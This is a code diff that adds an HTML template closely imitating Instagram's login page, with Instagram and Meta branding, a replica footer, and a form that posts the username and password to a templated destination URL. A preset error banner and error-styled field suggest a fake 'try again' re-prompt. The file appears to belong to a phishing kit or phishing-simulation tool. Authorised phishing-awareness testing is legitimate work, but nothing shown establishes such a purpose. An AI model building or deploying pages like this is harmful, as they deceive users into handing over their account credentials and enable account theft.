@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="/static/style.css">
+    <link rel="icon" href="/static/favicon.ico">
+</head>
+<body>
+    <div class="fb-page">
+        <div class="fb-hero">
+            <div class="fb-hero-top">
+                <img src="/static/logo.svg" alt="Instagram" class="fb-icon">
+            </div>
+            <div class="fb-hero-center">
+                <img src="/static/collage.png" alt="" class="fb-collage-img">
+            </div>
+        </div>
+        <div class="fb-login-side">
+            <div class="fb-login-form">
+                <h2 class="fb-login-title">Log into Instagram</h2>
+                <form action="{{ post_url }}" method="POST">
+                    <div class="fb-error-banner">
+                        {{ error_message }}
+                    </div>
+                    <div class="fb-input-wrap">
+                        <input
+                            type="text"
+                            name="email"
+                            class="fb-input fb-input-error"
+                            placeholder="Phone number, username, or email"
+                            aria-label="Phone number, username, or email"
+                            autofocus
+                        >
+                    </div>
+                    <div class="fb-input-wrap">
+                        <input
+                            type="password"
+                            name="pass"
+                            class="fb-input"
+                            placeholder="Password"
+                            aria-label="Password"
+                        >
+                    </div>
+                    <button type="submit" class="fb-btn-login">Log in</button>
+                </form>
+                <div class="fb-forgot">
+                    <a href="#">Forgot password?</a>
+                </div>
+                <div class="fb-create-wrapper">
+                    <a href="#" class="fb-btn-create">Create new account</a>
+                </div>
+                <div class="fb-meta-logo">
+                    <img src="/static/meta.svg" alt="Meta" class="fb-meta-img">
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer class="fb-footer">
+        <div class="fb-footer-content ig-footer-content">
+            <div class="fb-footer-links">
+                <a href="#">Meta</a>
+                <a href="#">About</a>
+                <a href="#">Blog</a>
+                <a href="#">Jobs</a>
+                <a href="#">Help</a>
+                <a href="#">API</a>
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
+                <a href="#">Locations</a>
+                <a href="#">Instagram Lite</a>
+                <a href="#">Meta AI</a>
+                <a href="#">Threads</a>
+                <a href="#">Contact Uploading & Non-Users</a>
+                <a href="#">Meta Verified</a>
+            </div>
+            <div class="ig-footer-bottom">
+                <span>English &#9660;</span>
+                <span>&copy; 2026 Instagram from Meta</span>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
